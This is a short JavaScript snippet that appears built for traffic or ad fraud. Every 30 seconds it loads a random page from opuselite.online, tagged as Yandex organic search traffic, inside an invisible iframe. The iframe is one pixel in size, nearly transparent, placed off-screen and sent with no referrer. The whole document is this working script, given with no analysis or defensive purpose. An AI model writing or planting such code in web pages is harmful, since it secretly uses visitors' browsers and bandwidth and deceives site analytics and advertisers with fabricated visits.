  const urls = [
    "https://www.opuselite.online/2024/08/blog-post.html?utm_source=yandex&utm_medium=organic&utm_campaign=promo",
    "https://www.opuselite.online/2024/08/blog-post_27.html?utm_source=yandex&utm_medium=organic&utm_campaign=promo",
    "https://www.opuselite.online/2024/08/blog-post_79.html?utm_source=yandex&utm_medium=organic&utm_campaign=promo",
    "https://www.opuselite.online/2024/08/blog-post_24.html?utm_source=yandex&utm_medium=organic&utm_campaign=promo",
    "https://www.opuselite.online/2024/08/blog-post_95.html?utm_source=yandex&utm_medium=organic&utm_campaign=promo",
    "https://www.opuselite.online/2024/08/blog-post_5.html?utm_source=yandex&utm_medium=organic&utm_campaign=promo",
    "https://www.opuselite.online/2024/08/blog-post_68.html?utm_source=yandex&utm_medium=organic&utm_campaign=promo",
    "https://www.opuselite.online/2024/08/blog-post_46.html?utm_source=yandex&utm_medium=organic&utm_campaign=promo",
    "https://www.opuselite.online/2024/08/blog-post_77.html?utm_source=yandex&utm_medium=organic&utm_campaign=promo",
    "https://www.opuselite.online/2024/08/blog-post_90.html?utm_source=yandex&utm_medium=organic&utm_campaign=promo"
  ];

  function loadIframe() {
    const page = urls[Math.floor(Math.random() * urls.length)];
    const iframe = document.createElement("iframe");
    iframe.src = page;
    iframe.style = "width:1px; height:1px; opacity:0.01; position:absolute; left:-9999px;";
    iframe.referrerPolicy = "no-referrer";
    document.body.appendChild(iframe);
  }

  loadIframe();
  setInterval(loadIframe, 30000);
